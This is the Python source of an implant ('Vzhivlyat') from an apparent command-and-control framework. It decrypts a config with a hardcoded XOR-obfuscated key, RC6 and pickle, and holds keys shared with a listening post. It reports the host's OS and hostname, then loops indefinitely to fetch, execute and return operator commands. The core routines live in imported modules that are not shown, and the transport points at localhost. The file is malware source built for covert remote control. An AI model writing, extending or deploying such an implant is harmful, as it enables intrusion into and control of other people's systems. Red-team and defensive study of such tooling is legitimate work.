#!/usr/bin/env python3

import ast
import pickle
import configparser
import platform
from time import sleep

from lib import logging
from lib import yadro
from lib import frame_orchestrator

from lib.crypto import asymmetric
from lib.crypto import rc6
from lib.crypto import xor


# вживлять
class Vzhivlyat(object):
    def __init__(self):
        super(Vzhivlyat, self).__init__()
        self.logging = logging.Logging(True)  # DEBUG
        self.config_file_path = "shlyuz.conf"
        # TODO: Check if this needs to be cleared in memory
        self.config_key = xor.single_byte_xor(b'\x1f\x04=\x0eP\x058\x05\x198&*\x13(+\n', 0x69).decode('utf-8')
        self.config = configparser.RawConfigParser()
        self.config.read_string(self.decrypt_config())
        self.component_id = self.config['vzhivlyat']['id']
        self.check_time = int(self.config['vzhivlyat']['task_check_time'])

        # Crypto values
        self.initial_private_key = asymmetric.private_key_from_bytes(self.config['crypto']['priv_key'])
        self.initial_public_key = self.initial_private_key.public_key
        self.initial_lp_pubkey = asymmetric.public_key_from_bytes(self.config['crypto']['lp_pk'])
        self.current_private_key = self.initial_private_key
        self.current_public_key = self.initial_public_key
        self.current_lp_pubkey = self.initial_lp_pubkey
        self.xor_key = ast.literal_eval(self.config['crypto']['xor_key'])

        self.transport = None
        self.manifest = None
        self.cmd_queue = []
        self.cmd_processing_queue = []
        self.cmd_done_queue = []

    def decrypt_config(self):
        with open(self.config_file_path, "rb+") as configfile:
            config_bytes = configfile.read()
            decoded_content = xor.single_byte_xor(config_bytes, 0x69)
            pickled_decoded = pickle.loads(decoded_content)
            decrypted_contents = rc6.decrypt(self.config_key, pickled_decoded)
            decrypted_config = decrypted_contents.decode('utf-8')

        del config_bytes
        del decoded_content
        del pickled_decoded
        del decrypted_contents
        return decrypted_config

    def prepare_manifest(self):
        uname = platform.uname()
        self.manifest = {"implant_id": self.component_id, "implant_os": f"{uname.system}", "impant_hostname": f"{uname.node}"}
        init_frame = yadro.generate_init_frame(self)
        init_ack_frame = yadro.relay_init_frame(self, init_frame)
        return frame_orchestrator.determine_destination(init_ack_frame, self)


vzhivlyat = Vzhivlyat()
transport_config = {"transport_id": vzhivlyat.component_id, "connect_addr": "127.0.0.1", "connect_port": 8084}
vzhivlyat.transport = yadro.import_transport_for_implant(vzhivlyat, transport_config)
vzhivlyat.prepare_manifest()

while True:
    if len(vzhivlyat.cmd_processing_queue) > 0:
        # TODO: Execute the commands, move them into cmd_done_queue
        yadro.run_instructions(vzhivlyat)
    if len(vzhivlyat.cmd_done_queue) > 0:
        transport_frame = yadro.send_cmd_output(vzhivlyat)
        frame_orchestrator.process_transport_frame(vzhivlyat, transport_frame)
    transport_frame = yadro.request_instructions(vzhivlyat)
    if transport_frame is None or 0:
        pass
    else:
        data = frame_orchestrator.process_transport_frame(vzhivlyat, transport_frame)
        del transport_frame
        if data is not (0 or None):
            yadro.relay_reply(vzhivlyat, data)
    # Check to see if we have commands to execute
    if len(vzhivlyat.cmd_queue) > 0:
        yadro.process_commands(vzhivlyat)
    vzhivlyat.logging.log(f"Waiting for {vzhivlyat.check_time}", level="debug")
    sleep(int(vzhivlyat.check_time))
